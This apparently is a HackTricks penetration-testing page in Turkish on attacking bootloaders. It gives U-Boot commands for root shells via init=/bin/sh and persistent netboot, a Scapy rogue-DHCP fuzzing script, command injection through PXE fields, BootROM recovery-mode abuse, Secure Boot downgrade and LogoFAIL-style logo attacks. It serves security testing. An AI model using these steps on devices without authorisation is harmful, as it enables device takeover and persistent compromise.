# Bootloader Testi

{{#include ../../banners/hacktricks-training.md}}

Aşağıdaki adımlar, cihaz başlangıç yapılandırmalarını değiştirmek ve U-Boot ve UEFI-sınıfı loader'lar gibi bootloader'ları test etmek için önerilir. Erken kod yürütmeyi elde etmeye, imza/rollback korumalarını değerlendirmeye ve kurtarma veya ağ-boot yollarını kötüye kullanmaya odaklanın.

## U-Boot hızlı kazanımları ve env kötüye kullanımı

1. Interpreter shell'e erişim
- Boot sırasında, `bootcmd` çalışmadan önce bilinen bir kırılma tuşuna basın (çoğunlukla herhangi bir tuş, 0, space veya karta özgü bir "magic" dizisi) ve U-Boot istemine düşün.

2. Boot durumunu ve değişkenleri inceleyin
- Faydalı komutlar:
- `printenv` (env dökümü)
- `bdinfo` (kart bilgisi, bellek adresleri)
- `help bootm; help booti; help bootz` (desteklenen kernel boot yöntemleri)
- `help ext4load; help fatload; help tftpboot` (mevcut loader'lar)

3. Root shell almak için boot argümanlarını değiştirin
- Kernel'in normal init yerine shell'e drop etmesi için `init=/bin/sh` ekleyin:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP sunucunuzdan Netboot
- Ağı yapılandırın ve LAN'dan bir kernel/fit image çekin:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Değişiklikleri env üzerinden kalıcı hale getirme
- Eğer env depolama write-protected değilse kontrolü kalıcı hale getirebilirsiniz:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` gibi geri dönüş yollarını etkileyen değişkenleri kontrol edin. Yanlış yapılandırılmış değerler, tekrar tekrar shell'e girmenizi sağlayabilir.

6. Debug/tehlikeli özellikleri kontrol edin
- Şunlara bakın: `bootdelay` > 0, `autoboot` devre dışı, kısıtlamasız `usb start; fatload usb 0:1 ...`, serial üzerinden `loady`/`loads` yeteneği, `env import`'un güvensiz medyadan yapılabilmesi ve imza kontrolleri olmadan yüklenen kernel/ramdisk'ler.

7. U-Boot image/doğrulama testi
- Platform FIT imagelar ile secure/verified boot iddia ediyorsa unsigned veya değiştirilmiş imajları deneyin:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` eksikliği veya legacy `verify=n` davranışı genellikle rastgele payload'ların boot edilmesine izin verir.

## Ağ-önyükleme yüzeyi (DHCP/PXE) ve sahte sunucular

8. PXE/DHCP parametre fuzzing
- U-Boot’un legacy BOOTP/DHCP işleme kodunda bellek güvenliği sorunları olmuştur. Örneğin, CVE‑2024‑42040, crafted DHCP cevapları aracılığıyla bellek ifşası yoluyla U-Boot bellekten baytların wire üzerinde leak edilmesine neden olmaktadır. bootfile-name (option 67), vendor option'lar, file/servername alanları gibi aşırı uzun/edge-case değerlere sahip DHCP/PXE kod yollarını test edin ve takılma/leak için gözlemleyin.
- Netboot sırasında boot parametrelerini zorlamak için minimal Scapy snippet:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Ayrıca, PXE filename alanlarının OS tarafı provisioning script'leri zincirlendiğinde shell/loader mantığına sanitize edilmeden geçirilip geçirilmediğini doğrulayın.

9. Sahte DHCP sunucusu ile command injection testi
- Sahte bir DHCP/PXE servisi kurun ve filename veya option alanlarına karakterler enjekte ederek boot zincirinin sonraki aşamalarında komut yorumlayıcılarına ulaşmayı deneyin. Metasploit’in DHCP auxiliary, `dnsmasq` veya özel Scapy script'leri iyi çalışır. Önce laboratuvar ağını izole ettiğinizden emin olun.

## Normal boot'u geçersiz kılan SoC ROM recovery modları

Birçok SoC, flash imajları geçersiz olsa bile USB/UART üzerinden kod kabul eden bir BootROM "loader" modunu açığa çıkarır. Eğer secure-boot fuse'ları yakılmamışsa, bu zincirde çok erken rastgele kod yürütme sağlayabilir.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) veya `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` ile RAM'den özel bir U-Boot çalıştırın.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` veya `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` ile bir loader sahneleyip özel bir U-Boot yükleyin.

Cihazın secure-boot eFuses/OTP yakılıp yakılmadığını değerlendirin. Eğer değilse, BootROM download modları sıklıkla herhangi bir üst seviye doğrulamayı (U-Boot, kernel, rootfs) atlayarak ilk aşama payload'unuzu doğrudan SRAM/DRAM'den çalıştırır.

## UEFI/PC-sınıfı önyükleyiciler: hızlı kontroller

10. ESP müdahalesi ve rollback testi
- EFI System Partition (ESP)'yi bağlayın ve loader bileşenlerini kontrol edin: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo yolları.
- Eğer Secure Boot revocation'ları (dbx) güncel değilse, downgrade edilmiş veya bilinen zafiyetli signed boot bileşenleri ile boot etmeyi deneyin. Platform eski shim/bootmanager'ları hâlâ güveniyorsa, ESP'den kendi kernel'inizi veya `grub.cfg`'nizi yükleyerek persistence elde edebilirsiniz.

11. Boot logo parsing hataları (LogoFAIL sınıfı)
- Birçok OEM/IBV firmware, DXE'de boot logolarını işleyen görüntü-parsing hatalarına karşı savunmasızdı. Eğer bir saldırgan ESP üzerinde vendor-özgü bir yola (ör. `\EFI\<vendor>\logo\*.bmp`) crafted bir görüntü yerleştirebiliyorsa ve reboot edebiliyorsa, Secure Boot etkin olsa bile erken boot sırasında kod yürütme mümkün olabilir. Platformun kullanıcı tarafından sağlanan logoları kabul edip etmediğini ve bu yolların OS'den yazılabilir olup olmadığını test edin.

## Donanım uyarısı

Erken boot sırasında SPI/NAND flash ile etkileşimde bulunurken (ör. okumaları atlamak için pinleri topraklama) dikkatli olun ve her zaman flash datasheet'ini danışın. Zamanlaması yanlış kısa devreler cihazı veya programmer'ı bozabilir.

## Notlar ve ek ipuçları

- `env export -t ${loadaddr}` ve `env import -t ${loadaddr}` ile environment blob'larını RAM ve depolama arasında taşıyın; bazı platformlar auth olmadan çıkarılabilir medyadan env import edilmesine izin verir.
- extlinux.conf ile bootlanan Linux tabanlı sistemlerde persistence için boot partition'daki `APPEND` satırını değiştirmek (örneğin `init=/bin/sh` veya `rd.break` eklemek) genellikle yeterlidir, eğer imza kontrolleri uygulanmıyorsa.
- Eğer userland `fw_printenv/fw_setenv` sağlıyorsa, `/etc/fw_env.config`'un gerçek env depolaması ile eşleştiğini doğrulayın. Yanlış yapılandırılmış offset'ler yanlış MTD bölgesini okuma/yazma imkanı verebilir.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
